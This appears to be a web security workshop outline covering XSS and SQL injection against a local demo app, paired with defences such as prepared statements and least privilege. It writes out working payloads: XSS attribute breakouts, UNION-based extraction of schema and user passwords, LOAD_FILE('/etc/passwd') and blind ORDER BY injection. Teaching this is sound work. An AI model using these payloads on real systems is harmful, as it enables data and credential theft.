>_'Focus on attacks to know how to protect'_

What is security?
- Confidentiality - no stolen data
- Integrity - no corrupt data
- Availability - no DoS

http://www.owasp.org - security wiki/community

https://www.exploit-db.com/ - attack wiki/community

# Client Side

## GET and POST
Should accept only relevant parameters
- if GET accepts POST params - allows to hide values, send more data, bypass firewalls
- if POST accepts GET params - easier CSRF

## Input Data
Whole HTTP request including headers, imported files, file names etc.

TODO: if Apache access logs are publicly visible, then it is possible to inject JS via User-Agent

## Input Data Validation
1. Client-side - usability
2. Server-side - validation

Invalid input means:
- insufficient client-side check or
- hacker

## Input manipulation tools
- Burp Suite
- Tamper data FF plugin
etc.

## Web Content Injection - typically named XSS
1. USER enters some data (e.g. username/password)
2. CLIENT sends HTTP REQUEST to SERVER
3. Server creates HTTP RESPONSE and sends it to CLIENT
4. CLIENT renders data that comes from SERVER
  - renders HTML
  - loads content, e.g. ```<img> <iframe> <script> <style>```
  - executes Javascript
5. USER enters some data and modifies DOM CLIENT-side
  e.g. $('div').innerHtml = <script>alert(1)</script>

### HTML injection
```html
<input value="user-input" />
<input value=user-input /> <!--HTML5-->
```
### DEMO
http://localhost:8080/search

- When query is entered it is reflected back by server
- How to detect hole? Search for: `test ' " < > <tag>`
- check 'View source' not 'Inspect' to find broken HTML
- `" autofocus onfocus="alert(1)"`
- chrome detects XSS attack vector - what about safari, firefox
- TODO: what about escaping html, so that detection does not help?

```html
alert(1) == &#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;
```

#### Wrong Content-Type
http://localhost:8080/rest/partner

What if partner can change his name?
http://localhost:8080/rest/partner?name=abc

#### "I use well-known templating framework and it will do the work"

Spring Boot App + Freemarker

http://freemarker.org/docs/pgui_config_outputformatsautoesc.html

> _By default, templates have "undefined" output format associated, which does no escaping, and in general gives the behavior that you would expect from a template engine that doesn't care about output formats and escaping._

```java
configuration.setOutputFormat(HTMLOutputFormat.INSTANCE);
```

### Javascript injection

//? $.getJSON

//x-content-type-options: nosniff

### URL manipulation

## Cookies
## Sessions
## Request Forgery
## UI redress attacks

## Server Side

## Business logic flaws
## Google hacking
## File handling

## SQL injection

### DEMO: SELECT
http://localhost:8080/sql/search
- `' OR 1=1`
- `' OR 1=1 #`

#### How many columns there are?
- `' UNION SELECT 1 #`
- `' UNION SELECT 1,2 #`
- etc.

#### Useful info
```sql
SELECT DATABASE(), USER(), SERVER()
```
`' UNION SELECT 1, USER(), 3 #`

#### Database structure
E.g. MySQL
```sql
SELECT * FROM INFORMATION_SCHEMA.COLUMNS
```
`' UNION SELECT 1, CONCAT(TABLE_SCHEMA,',',TABLE_NAME,',',COLUMN_NAME),3 FROM INFORMATION_SCHEMA.COLUMNS #`

#### User table
`' UNION SELECT 1, CONCAT(USERNAME,',',PASSWORD), 3` FROM USERS #

#### Read files
`' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3 #`

DEFENCE: 

- do not use `root` MySQL database user with access to all files in your machine
- avoid `GRANT ALL PRIVILEGES` as it contains `FILE` privilege

> FILE - Enable the user to cause the server to read or write files. Level: Global.`
http://dev.mysql.com/doc/refman/5.7/en/grant.html

#### DEFENCE - Prepared statements

```java
  PreparedStatement updateSales = con.prepareStatement(
      "SELECT * FROM products WHERE name like ?");
  updateSales.setString(1, "%"+query+"%");
```

What about searching: `%`

### DEMO: UPDATE

### DEMO: ORDER BY

```java
PreparedStatement updateSales = con.prepareStatement(
          "SELECT * FROM products ORDER BY ?");
      updateSales.setString(1, orderBy);
```

?

http://localhost:8080/sql/list?orderBy=price

`IF(1=1,price,name)`

#### DEFENCE
- Do not use user input in order by
- E.g. use enum that translates to "good" SQL

### DEMO: BLIND

`IF(1=1,price,name)` vs `IF(1=2,price,name)`

`IF(EXISTS(SELECT * FROM USERS WHERE USERNAME='admin'),price,name)`

http://localhost:8080/hack